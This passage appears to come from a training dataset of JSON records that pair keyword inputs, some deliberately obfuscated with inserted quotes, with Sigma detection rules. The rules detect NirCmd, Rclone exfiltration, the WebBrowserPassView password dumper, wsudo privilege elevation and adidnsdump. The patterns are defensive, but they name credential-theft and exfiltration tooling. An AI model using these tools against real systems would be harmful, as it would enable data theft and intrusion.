(https://learn.microsoft.com/en-us/azure/bot-service/bot-service-debug-channel-ngrok?view=azure-bot-service-4.0)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\NirCmd.exe NirCmd.exe execmd .exe script .exe shexec runinteractive exec exec2 show hide", "output": "title: PUA - NirCmd Execution\nid: 4e2ed651-1906-4a59-a78a-18220fca1b22\nstatus: test\ndescription: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity\nreferences:\n    - https://www.nirsoft.net/utils/nircmd.html\n    - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/\n    - https://www.nirsoft.net/utils/nircmd2.html#using\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-24\nmodified: 2023-02-13\ntags:\n    - attack.execution\n    - attack.t1569.002\n    - attack.s0029\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_org:\n        - Image|endswith: '\\NirCmd.exe'\n        - OriginalFileName: 'NirCmd.exe'\n    selection_cmd:\n        CommandLine|contains:\n            - ' execmd '\n            - '.exe script '\n            - '.exe shexec '\n            - ' runinteractive '\n    combo_exec:\n        CommandLine|contains:\n            - ' exec '\n            - ' exec2 '\n    combo_exec_params:\n        CommandLine|contains:\n            - ' show '\n            - ' hide '\n    condition: 1 of selection_* or all of combo_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use by administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\NirCmd.exe NirCmd.exe execmd \".\"\"e\"\"x\"\"e\" script .exe shexec runinteractive exec exec2 show hide", "output": "title: PUA - NirCmd Execution\nid: 4e2ed651-1906-4a59-a78a-18220fca1b22\nstatus: test\ndescription: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity\nreferences:\n    - https://www.nirsoft.net/utils/nircmd.html\n    - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/\n    - https://www.nirsoft.net/utils/nircmd2.html#using\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-24\nmodified: 2023-02-13\ntags:\n    - attack.execution\n    - attack.t1569.002\n    - attack.s0029\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_org:\n        - Image|endswith: '\\NirCmd.exe'\n        - OriginalFileName: 'NirCmd.exe'\n    selection_cmd:\n        CommandLine|contains:\n            - ' execmd '\n            - '.exe script '\n            - '.exe shexec '\n            - ' runinteractive '\n    combo_exec:\n        CommandLine|contains:\n            - ' exec '\n            - ' exec2 '\n    combo_exec_params:\n        CommandLine|contains:\n            - ' show '\n            - ' hide '\n    condition: 1 of selection_* or all of combo_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use by administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\NirCmd NirCmd execmd script shexec runinteractive exec exec2 show hide", "output": "title: PUA - NirCmd Execution\nid: 4e2ed651-1906-4a59-a78a-18220fca1b22\nstatus: test\ndescription: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity\nreferences:\n    - https://www.nirsoft.net/utils/nircmd.html\n    - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/\n    - https://www.nirsoft.net/utils/nircmd2.html#using\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-24\nmodified: 2023-02-13\ntags:\n    - attack.execution\n    - attack.t1569.002\n    - attack.s0029\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_org:\n        - Image|endswith: '\\NirCmd.exe'\n        - OriginalFileName: 'NirCmd.exe'\n    selection_cmd:\n        CommandLine|contains:\n            - ' execmd '\n            - '.exe script '\n            - '.exe shexec '\n            - ' runinteractive '\n    combo_exec:\n        CommandLine|contains:\n            - ' exec '\n            - ' exec2 '\n    combo_exec_params:\n        CommandLine|contains:\n            - ' show '\n            - ' hide '\n    condition: 1 of selection_* or all of combo_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use by administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\NirCmd.exe NirCmd.exe execmd .exe script .exe shexec runinteractive exec exec2 show hide", "output": "title: PUA - NirCmd Execution\nid: 4e2ed651-1906-4a59-a78a-18220fca1b22\nstatus: test\ndescription: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity\nreferences:\n    - https://www.nirsoft.net/utils/nircmd.html\n    - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/\n    - https://www.nirsoft.net/utils/nircmd2.html#using\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-24\nmodified: 2023-02-13\ntags:\n    - attack.execution\n    - attack.t1569.002\n    - attack.s0029\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_org:\n        - Image|endswith: '\\NirCmd.exe'\n        - OriginalFileName: 'NirCmd.exe'\n    selection_cmd:\n        CommandLine|contains:\n            - ' execmd '\n            - '.exe script '\n            - '.exe shexec '\n            - ' runinteractive '\n    combo_exec:\n        CommandLine|contains:\n            - ' exec '\n            - ' exec2 '\n    combo_exec_params:\n        CommandLine|contains:\n            - ' show '\n            - ' hide '\n    condition: 1 of selection_* or all of combo_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use by administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "runassystem", "output": "title: PUA - NirCmd Execution\nid: 4e2ed651-1906-4a59-a78a-18220fca1b22\nstatus: test\ndescription: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity\nreferences:\n    - https://www.nirsoft.net/utils/nircmd.html\n    - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/\n    - https://www.nirsoft.net/utils/nircmd2.html#using\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-24\nmodified: 2023-02-13\ntags:\n    - attack.execution\n    - attack.t1569.002\n    - attack.s0029\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_org:\n        - Image|endswith: '\\NirCmd.exe'\n        - OriginalFileName: 'NirCmd.exe'\n    selection_cmd:\n        CommandLine|contains:\n            - ' execmd '\n            - '.exe script '\n            - '.exe shexec '\n            - ' runinteractive '\n    combo_exec:\n        CommandLine|contains:\n            - ' exec '\n            - ' exec2 '\n    combo_exec_params:\n        CommandLine|contains:\n            - ' show '\n            - ' hide '\n    condition: 1 of selection_* or all of combo_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use by administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "runassystem", "output": "title: PUA - NirCmd Execution\nid: 4e2ed651-1906-4a59-a78a-18220fca1b22\nstatus: test\ndescription: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity\nreferences:\n    - https://www.nirsoft.net/utils/nircmd.html\n    - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/\n    - https://www.nirsoft.net/utils/nircmd2.html#using\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-24\nmodified: 2023-02-13\ntags:\n    - attack.execution\n    - attack.t1569.002\n    - attack.s0029\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_org:\n        - Image|endswith: '\\NirCmd.exe'\n        - OriginalFileName: 'NirCmd.exe'\n    selection_cmd:\n        CommandLine|contains:\n            - ' execmd '\n            - '.exe script '\n            - '.exe shexec '\n            - ' runinteractive '\n    combo_exec:\n        CommandLine|contains:\n            - ' exec '\n            - ' exec2 '\n    combo_exec_params:\n        CommandLine|contains:\n            - ' show '\n            - ' hide '\n    condition: 1 of selection_* or all of combo_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use by administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "runassystem", "output": "title: PUA - NirCmd Execution\nid: 4e2ed651-1906-4a59-a78a-18220fca1b22\nstatus: test\ndescription: Detects the use of NirCmd tool for command execution, which could be the result of legitimate administrative activity\nreferences:\n    - https://www.nirsoft.net/utils/nircmd.html\n    - https://www.winhelponline.com/blog/run-program-as-system-localsystem-account-windows/\n    - https://www.nirsoft.net/utils/nircmd2.html#using\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-01-24\nmodified: 2023-02-13\ntags:\n    - attack.execution\n    - attack.t1569.002\n    - attack.s0029\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_org:\n        - Image|endswith: '\\NirCmd.exe'\n        - OriginalFileName: 'NirCmd.exe'\n    selection_cmd:\n        CommandLine|contains:\n            - ' execmd '\n            - '.exe script '\n            - '.exe shexec '\n            - ' runinteractive '\n    combo_exec:\n        CommandLine|contains:\n            - ' exec '\n            - ' exec2 '\n    combo_exec_params:\n        CommandLine|contains:\n            - ' show '\n            - ' hide '\n    condition: 1 of selection_* or all of combo_*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Legitimate use by administrators\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--config --no-check-certificate copy \\rclone.exe pass user copy sync config lsd remote ls mega pcloud ftp ignore-existing auto-confirm transfers multi-thread-streams no-check-certificate", "output": "title: PUA - Rclone Execution\nid: e37db05d-d1f9-49c8-b464-cee1a4b11638\nrelated:\n    - id: a0d63692-a531-4912-ad39-4393325b2a9c\n      type: obsolete\n    - id: cb7286ba-f207-44ab-b9e6-760d82b84253\n      type: obsolete\nstatus: test\ndescription: Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc\nreferences:\n    - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/\n    - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware\n    - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a\n    - https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone\n    - https://www.splunk.com/en_us/blog/security/darkside-ransomware-splunk-threat-update-and-detections.html\nauthor: Bhabesh Raj, Sittikorn S, Aaron Greetham (@beardofbinary) - NCC Group\ndate: 2021-05-10\nmodified: 2023-03-05\ntags:\n    - attack.exfiltration\n    - attack.t1567.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_specific_options:\n        CommandLine|contains|all:\n            - '--config '\n            - '--no-check-certificate '\n            - ' copy '\n    selection_rclone_img:\n        - Image|endswith: '\\rclone.exe'\n        - Description: 'Rsync for cloud storage'\n    selection_rclone_cli:\n        CommandLine|contains:\n            - 'pass'\n            - 'user'\n            - 'copy'\n            - 'sync'\n            - 'config'\n            - 'lsd'\n            - 'remote'\n            - 'ls'\n            - 'mega'\n            - 'pcloud'\n            - 'ftp'\n            - 'ignore-existing'\n            - 'auto-confirm'\n            - 'transfers'\n            - 'multi-thread-streams'\n            - 'no-check-certificate '\n    condition: selection_specific_options or all of selection_rclone_*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Details\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--config --no-check-certificate copy \\rclone.exe \\\"p\\\"\\\"a\\\"\\\"s\\\"\\\"s\\\" user copy sync config lsd remote ls mega pcloud ftp ignore-existing auto-confirm transfers multi-thread-streams no-check-certificate", "output": "title: PUA - Rclone Execution\nid: e37db05d-d1f9-49c8-b464-cee1a4b11638\nrelated:\n    - id: a0d63692-a531-4912-ad39-4393325b2a9c\n      type: obsolete\n    - id: cb7286ba-f207-44ab-b9e6-760d82b84253\n      type: obsolete\nstatus: test\ndescription: Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc\nreferences:\n    - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/\n    - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware\n    - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a\n    - https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone\n    - https://www.splunk.com/en_us/blog/security/darkside-ransomware-splunk-threat-update-and-detections.html\nauthor: Bhabesh Raj, Sittikorn S, Aaron Greetham (@beardofbinary) - NCC Group\ndate: 2021-05-10\nmodified: 2023-03-05\ntags:\n    - attack.exfiltration\n    - attack.t1567.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_specific_options:\n        CommandLine|contains|all:\n            - '--config '\n            - '--no-check-certificate '\n            - ' copy '\n    selection_rclone_img:\n        - Image|endswith: '\\rclone.exe'\n        - Description: 'Rsync for cloud storage'\n    selection_rclone_cli:\n        CommandLine|contains:\n            - 'pass'\n            - 'user'\n            - 'copy'\n            - 'sync'\n            - 'config'\n            - 'lsd'\n            - 'remote'\n            - 'ls'\n            - 'mega'\n            - 'pcloud'\n            - 'ftp'\n            - 'ignore-existing'\n            - 'auto-confirm'\n            - 'transfers'\n            - 'multi-thread-streams'\n            - 'no-check-certificate '\n    condition: selection_specific_options or all of selection_rclone_*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Details\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--config --no-check-certificate copy \\rclone pass user copy sync config lsd remote ls mega pcloud ftp ignore-existing auto-confirm transfers multi-thread-streams no-check-certificate", "output": "title: PUA - Rclone Execution\nid: e37db05d-d1f9-49c8-b464-cee1a4b11638\nrelated:\n    - id: a0d63692-a531-4912-ad39-4393325b2a9c\n      type: obsolete\n    - id: cb7286ba-f207-44ab-b9e6-760d82b84253\n      type: obsolete\nstatus: test\ndescription: Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc\nreferences:\n    - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/\n    - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware\n    - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a\n    - https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone\n    - https://www.splunk.com/en_us/blog/security/darkside-ransomware-splunk-threat-update-and-detections.html\nauthor: Bhabesh Raj, Sittikorn S, Aaron Greetham (@beardofbinary) - NCC Group\ndate: 2021-05-10\nmodified: 2023-03-05\ntags:\n    - attack.exfiltration\n    - attack.t1567.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_specific_options:\n        CommandLine|contains|all:\n            - '--config '\n            - '--no-check-certificate '\n            - ' copy '\n    selection_rclone_img:\n        - Image|endswith: '\\rclone.exe'\n        - Description: 'Rsync for cloud storage'\n    selection_rclone_cli:\n        CommandLine|contains:\n            - 'pass'\n            - 'user'\n            - 'copy'\n            - 'sync'\n            - 'config'\n            - 'lsd'\n            - 'remote'\n            - 'ls'\n            - 'mega'\n            - 'pcloud'\n            - 'ftp'\n            - 'ignore-existing'\n            - 'auto-confirm'\n            - 'transfers'\n            - 'multi-thread-streams'\n            - 'no-check-certificate '\n    condition: selection_specific_options or all of selection_rclone_*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Details\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "--config --no-check-certificate copy \\rclone.exe pass user copy sync config lsd remote ls mega pcloud ftp ignore-existing auto-confirm transfers multi-thread-streams no-check-certificate", "output": "title: PUA - Rclone Execution\nid: e37db05d-d1f9-49c8-b464-cee1a4b11638\nrelated:\n    - id: a0d63692-a531-4912-ad39-4393325b2a9c\n      type: obsolete\n    - id: cb7286ba-f207-44ab-b9e6-760d82b84253\n      type: obsolete\nstatus: test\ndescription: Detects execution of RClone utility for exfiltration as used by various ransomwares strains like REvil, Conti, FiveHands, etc\nreferences:\n    - https://research.nccgroup.com/2021/05/27/detecting-rclone-an-effective-tool-for-exfiltration/\n    - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware\n    - https://us-cert.cisa.gov/ncas/analysis-reports/ar21-126a\n    - https://labs.sentinelone.com/egregor-raas-continues-the-chaos-with-cobalt-strike-and-rclone\n    - https://www.splunk.com/en_us/blog/security/darkside-ransomware-splunk-threat-update-and-detections.html\nauthor: Bhabesh Raj, Sittikorn S, Aaron Greetham (@beardofbinary) - NCC Group\ndate: 2021-05-10\nmodified: 2023-03-05\ntags:\n    - attack.exfiltration\n    - attack.t1567.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_specific_options:\n        CommandLine|contains|all:\n            - '--config '\n            - '--no-check-certificate '\n            - ' copy '\n    selection_rclone_img:\n        - Image|endswith: '\\rclone.exe'\n        - Description: 'Rsync for cloud storage'\n    selection_rclone_cli:\n        CommandLine|contains:\n            - 'pass'\n            - 'user'\n            - 'copy'\n            - 'sync'\n            - 'config'\n            - 'lsd'\n            - 'remote'\n            - 'ls'\n            - 'mega'\n            - 'pcloud'\n            - 'ftp'\n            - 'ignore-existing'\n            - 'auto-confirm'\n            - 'transfers'\n            - 'multi-thread-streams'\n            - 'no-check-certificate '\n    condition: selection_specific_options or all of selection_rclone_*\nfields:\n    - CommandLine\n    - ParentCommandLine\n    - Details\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WebBrowserPassView.exe", "output": "title: PUA - WebBrowserPassView Execution\nid: d0dae994-26c6-4d2d-83b5-b3c8b79ae513\nstatus: test\ndescription: Detects the execution of WebBrowserPassView.exe. A password recovery tool that reveals the passwords stored by the following Web browsers, Internet Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome, Safari, and Opera\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1555.003/T1555.003.md\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-14\ntags:\n    - attack.credential-access\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'Web Browser Password Viewer'\n        - Image|endswith: '\\WebBrowserPassView.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\WebBrowserPassView.exe\\\"", "output": "title: PUA - WebBrowserPassView Execution\nid: d0dae994-26c6-4d2d-83b5-b3c8b79ae513\nstatus: test\ndescription: Detects the execution of WebBrowserPassView.exe. A password recovery tool that reveals the passwords stored by the following Web browsers, Internet Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome, Safari, and Opera\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1555.003/T1555.003.md\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-14\ntags:\n    - attack.credential-access\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'Web Browser Password Viewer'\n        - Image|endswith: '\\WebBrowserPassView.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WebBrowserPassView", "output": "title: PUA - WebBrowserPassView Execution\nid: d0dae994-26c6-4d2d-83b5-b3c8b79ae513\nstatus: test\ndescription: Detects the execution of WebBrowserPassView.exe. A password recovery tool that reveals the passwords stored by the following Web browsers, Internet Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome, Safari, and Opera\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1555.003/T1555.003.md\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-14\ntags:\n    - attack.credential-access\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'Web Browser Password Viewer'\n        - Image|endswith: '\\WebBrowserPassView.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WebBrowserPassView.exe", "output": "title: PUA - WebBrowserPassView Execution\nid: d0dae994-26c6-4d2d-83b5-b3c8b79ae513\nstatus: test\ndescription: Detects the execution of WebBrowserPassView.exe. A password recovery tool that reveals the passwords stored by the following Web browsers, Internet Explorer (Version 4.0 - 11.0), Mozilla Firefox (All Versions), Google Chrome, Safari, and Opera\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1555.003/T1555.003.md\nauthor: frack113\ndate: 2022-08-20\nmodified: 2023-02-14\ntags:\n    - attack.credential-access\n    - attack.t1555.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Description: 'Web Browser Password Viewer'\n        - Image|endswith: '\\WebBrowserPassView.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsudo.exe wsudo.exe \\wsudo-bridge.exe -u System -uSystem -u TrustedInstaller -uTrustedInstaller --ti", "output": "title: PUA - Wsudo Suspicious Execution\nid: bdeeabc9-ff2a-4a51-be59-bb253aac7891\nstatus: test\ndescription: Detects usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc)\nreferences:\n    - https://github.com/M2Team/Privexec/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-02\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\wsudo.exe'\n        - OriginalFileName: 'wsudo.exe'\n        - Description: 'Windows sudo utility'\n        - ParentImage|endswith: '\\wsudo-bridge.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '-u System'\n            - '-uSystem'\n            - '-u TrustedInstaller'\n            - '-uTrustedInstaller'\n            - ' --ti '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsudo.exe wsudo.exe \\wsudo-bridge.exe -u System -uSystem -u TrustedInstaller \\\"-uTrustedInstaller\\\" --ti", "output": "title: PUA - Wsudo Suspicious Execution\nid: bdeeabc9-ff2a-4a51-be59-bb253aac7891\nstatus: test\ndescription: Detects usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc)\nreferences:\n    - https://github.com/M2Team/Privexec/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-02\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\wsudo.exe'\n        - OriginalFileName: 'wsudo.exe'\n        - Description: 'Windows sudo utility'\n        - ParentImage|endswith: '\\wsudo-bridge.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '-u System'\n            - '-uSystem'\n            - '-u TrustedInstaller'\n            - '-uTrustedInstaller'\n            - ' --ti '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsudo wsudo \\wsudo-bridge -u System -uSystem -u TrustedInstaller -uTrustedInstaller --ti", "output": "title: PUA - Wsudo Suspicious Execution\nid: bdeeabc9-ff2a-4a51-be59-bb253aac7891\nstatus: test\ndescription: Detects usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc)\nreferences:\n    - https://github.com/M2Team/Privexec/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-02\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\wsudo.exe'\n        - OriginalFileName: 'wsudo.exe'\n        - Description: 'Windows sudo utility'\n        - ParentImage|endswith: '\\wsudo-bridge.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '-u System'\n            - '-uSystem'\n            - '-u TrustedInstaller'\n            - '-uTrustedInstaller'\n            - ' --ti '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\wsudo.exe wsudo.exe \\wsudo-bridge.exe -u System -uSystem -u TrustedInstaller -uTrustedInstaller --ti", "output": "title: PUA - Wsudo Suspicious Execution\nid: bdeeabc9-ff2a-4a51-be59-bb253aac7891\nstatus: test\ndescription: Detects usage of wsudo (Windows Sudo Utility). Which is a tool that let the user execute programs with different permissions (System, Trusted Installer, Administrator...etc)\nreferences:\n    - https://github.com/M2Team/Privexec/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-12-02\nmodified: 2023-02-14\ntags:\n    - attack.execution\n    - attack.privilege-escalation\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_metadata:\n        - Image|endswith: '\\wsudo.exe'\n        - OriginalFileName: 'wsudo.exe'\n        - Description: 'Windows sudo utility'\n        - ParentImage|endswith: '\\wsudo-bridge.exe'\n    selection_cli:\n        CommandLine|contains:\n            - '-u System'\n            - '-uSystem'\n            - '-u TrustedInstaller'\n            - '-uTrustedInstaller'\n            - ' --ti '\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\python.exe adidnsdump", "output": "title: PUA - Adidnsdump Execution\nid: 26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160\nstatus: test\ndescription: |\n    This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,\n    Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md#atomic-test-9---remote-system-discovery---adidnsdump\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-21\ntags:\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\python.exe'\n        CommandLine|contains: 'adidnsdump'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\python.exe \"adidn\"sdump", "output": "title: PUA - Adidnsdump Execution\nid: 26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160\nstatus: test\ndescription: |\n    This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,\n    Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md#atomic-test-9---remote-system-discovery---adidnsdump\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-21\ntags:\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\python.exe'\n        CommandLine|contains: 'adidnsdump'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\python adidnsdump", "output": "title: PUA - Adidnsdump Execution\nid: 26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160\nstatus: test\ndescription: |\n    This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,\n    Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md#atomic-test-9---remote-system-discovery---adidnsdump\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-21\ntags:\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\python.exe'\n        CommandLine|contains: 'adidnsdump'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\python.exe adidnsdump", "output": "title: PUA - Adidnsdump Execution\nid: 26d3f0a2-f514-4a3f-a8a7-e7e48a8d9160\nstatus: test\ndescription: |\n    This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks Python 3 and python.exe must be installed,\n    Usee to Query/modify DNS records for Active Directory integrated DNS via LDAP\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1018/T1018.md#atomic-test-9---remote-system-discovery---adidnsdump\nauthor: frack113\ndate: 2022-01-01\nmodified: 2023-02-21\ntags:\n    - attack.discovery\n    - attack.t1018\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\python.exe'\n        CommandLine|contains: 'adidnsdump'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low"}
